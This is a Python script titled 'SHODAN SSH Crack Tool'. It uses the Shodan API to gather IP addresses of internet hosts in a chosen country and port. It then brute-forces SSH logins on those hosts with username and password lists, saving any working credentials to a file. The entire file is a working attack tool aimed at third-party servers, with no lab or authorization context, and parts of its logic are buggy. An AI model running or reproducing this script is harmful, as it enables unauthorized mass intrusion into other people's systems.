# SHODAN SSH Crack Tool

import shodan
import paramiko
import termcolor
import threading
import time
import socket

SHODAN_API_KEY = input("Shodan API Key: ")
country = input("Country Query: ")
port = int(input("Port: "))
page = int(input("Shodan Searh Page Limit: "))
usernames = input("Usernamme List: ")
passwords = input("Pass File: ")

api = shodan.Shodan(SHODAN_API_KEY)

for i in range(1, page):
    results = api.search(f"country:'{country}', {port}", page={i})
    for result in results['matches']:
        with open('ssh_targets.txt', 'a') as file:
            file.write(result["ip_str"] + "\n")

flag = 0
def ssh_connect(target, username, password):
    global flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=0.6)
        print(termcolor.colored((f"[+] Found : {target}:{username}:{password}"), "green"))
        flag = 1
    except paramiko.AuthenticationException:
        print(termcolor.colored((f"[-] Incorrect Login: {target}:{username}:{password}"), "red"))
    except socket.error:
        print(f"[-]Is {target} Offline?")
    ssh.close()


with open("ssh_targets.txt", "r") as file:
    for line in file.readlines():
        target = line.strip()
        with open(passwords, "r") as file:
            for line in file.readlines():
                password = line.strip()
                with open(usernames, "r") as file:
                    for line in file.readlines():
                        if flag == 1:
                            cracks = open("cracks.txt", "w")
                            cracks.write(f"{target}:{username}:{password}")
                            cracks.close()
                            t.join()
                            exit()
                        username = line.strip()
                        t = threading.Thread(target=ssh_connect, args=(target, username, password,))
                        t.start()
                        time.sleep(0.5)
